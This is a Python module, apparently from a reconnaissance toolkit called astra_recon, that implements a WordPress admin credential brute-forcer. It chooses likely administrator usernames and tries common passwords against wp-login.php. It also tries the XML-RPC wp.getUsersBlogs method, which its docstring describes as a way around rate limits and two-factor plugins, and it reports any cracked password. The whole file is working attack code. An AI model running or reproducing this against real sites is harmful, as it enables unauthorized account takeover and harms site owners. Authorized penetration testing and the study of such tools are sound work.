import time
import re
from typing import List, Optional, Tuple
from astra_recon.models import DiscoveredUser, BruteforceResult
from astra_recon.attacks.wordlists import load_wordlist
from astra_recon.utils.http_client import HttpClient
from astra_recon.utils.console import ReconConsole


class WordPressBruteforcer:
    """
    Automated Credential Brute-Forcer for Identified WordPress Admin Accounts.
    Tests high-frequency common passwords against wp-login.php and XML-RPC.
    """

    def __init__(
        self,
        target_url: str,
        client: HttpClient,
        console: Optional[ReconConsole] = None,
        delay: float = 0.2,
        max_attempts: int = 15,
        wordlist_path: Optional[str] = None,
    ):
        self.target_url = target_url
        self.client = client
        self.console = console
        self.delay = delay
        self.max_attempts = max_attempts
        self.passwords = load_wordlist(wordlist_path, limit=max_attempts)

    def select_admin_targets(self, users: List[DiscoveredUser]) -> List[str]:
        """
        Identifies the admin account(s) from enumerated users.
        Prioritizes users named 'admin', 'administrator', 'root', or with user_id=1.
        """
        admin_candidates = []

        # 1. Direct name match
        for u in users:
            name = u.username.lower()
            if name in ("admin", "administrator", "root", "wp-admin", "webmaster"):
                if u.username not in admin_candidates:
                    admin_candidates.append(u.username)

        # 2. Candidate flag or ID 1
        for u in users:
            if u.is_admin_candidate or u.user_id == 1:
                if u.username not in admin_candidates:
                    admin_candidates.append(u.username)

        # 3. Fallback: if no obvious admin username was found, pick the first discovered user
        if not admin_candidates and users:
            admin_candidates.append(users[0].username)

        return admin_candidates

    def _test_wp_login(self, username: str, password: str) -> Tuple[bool, str]:
        """
        Submits login POST to wp-login.php.
        Returns (success_boolean, reason_or_status).
        """
        login_url = f"{self.target_url}/wp-login.php"
        data = {
            "log": username,
            "pwd": password,
            "wp-submit": "Log In",
            "redirect_to": f"{self.target_url}/wp-admin/",
            "testcookie": "1",
        }

        # Don't follow redirects to capture the 302 location & auth cookie
        resp = self.client.safe_post(login_url, data=data, allow_redirects=False)

        # Check authentication success signals
        # Signal 1: 302 Redirect to wp-admin/
        location = resp.headers.get("Location") or resp.headers.get("location") or ""
        set_cookie = resp.headers.get("Set-Cookie") or resp.headers.get("set-cookie") or ""

        if resp.status_code in (302, 303) and ("wp-admin" in location or "dashboard" in location):
            return True, f"302 Redirect to {location}"

        # Signal 2: wordpress_logged_in cookie
        if "wordpress_logged_in" in set_cookie:
            return True, "Authentication cookie 'wordpress_logged_in' issued"

        # Signal 3: Response body does NOT have login_error and contains wp-admin or dashboard
        if resp.status_code == 200 and "login_error" not in resp.text and ("wp-admin" in resp.text or "Howdy" in resp.text):
            return True, "Session authenticated in response body"

        return False, "Invalid credentials"

    def _test_xmlrpc(self, username: str, password: str) -> Tuple[bool, str]:
        """
        Alternative brute-force vector via /xmlrpc.php using wp.getUsersBlogs.
        Fast and often bypasses standard wp-login.php rate limits or 2FA plugins.
        """
        xmlrpc_url = f"{self.target_url}/xmlrpc.php"
        payload = f"""<?xml version="1.0" encoding="utf-8"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value><string>{username}</string></value></param>
    <param><value><string>{password}</string></value></param>
  </params>
</methodCall>"""

        headers = {"Content-Type": "text/xml"}
        resp = self.client.safe_post(xmlrpc_url, data=payload, headers=headers)

        if resp.is_success and "<name>isAdmin</name>" in resp.text:
            return True, "XML-RPC wp.getUsersBlogs authenticated"

        return False, "XML-RPC authentication failed"

    def attack_user(self, username: str) -> BruteforceResult:
        """Runs dictionary attack against a specific username."""
        result = BruteforceResult(
            target_user=username,
            attempt_count=0,
            success=False,
            method_used="wp-login.php",
        )

        if self.console:
            self.console.bruteforce_status(
                f"Initiating dictionary attack on user '{username}' with top {len(self.passwords)} passwords..."
            )

        for pwd in self.passwords:
            result.attempt_count += 1
            success, reason = self._test_wp_login(username, pwd)

            # If wp-login failed or returned error, optionally try XML-RPC
            if not success and result.attempt_count == 1:
                xml_success, xml_reason = self._test_xmlrpc(username, pwd)
                if xml_success:
                    success = True
                    reason = xml_reason
                    result.method_used = "xmlrpc.php"

            if success:
                result.success = True
                result.cracked_password = pwd
                result.details = f"Password cracked successfully! Method: {result.method_used} ({reason})"
                if self.console:
                    self.console.bruteforce_success(username, pwd)
                return result

            # Rate-limiting delay between attempts
            if self.delay > 0:
                time.sleep(self.delay)

        result.details = f"All {result.attempt_count} common passwords failed against '{username}'."
        if self.console:
            self.console.bruteforce_status(
                f"Completed: No weak passwords identified for '{username}' among tested set."
            )

        return result

    def run_all(self, users: List[DiscoveredUser]) -> List[BruteforceResult]:
        """Runs brute force against all identified admin accounts."""
        results: List[BruteforceResult] = []
        admin_targets = self.select_admin_targets(users)

        if not admin_targets:
            if self.console:
                self.console.bruteforce_status("No candidate admin accounts available for brute-forcing.")
            return results

        for target_user in admin_targets:
            res = self.attack_user(target_user)
            results.append(res)
            # If we cracked an admin password, we can stop or continue
            if res.success:
                break

        return results
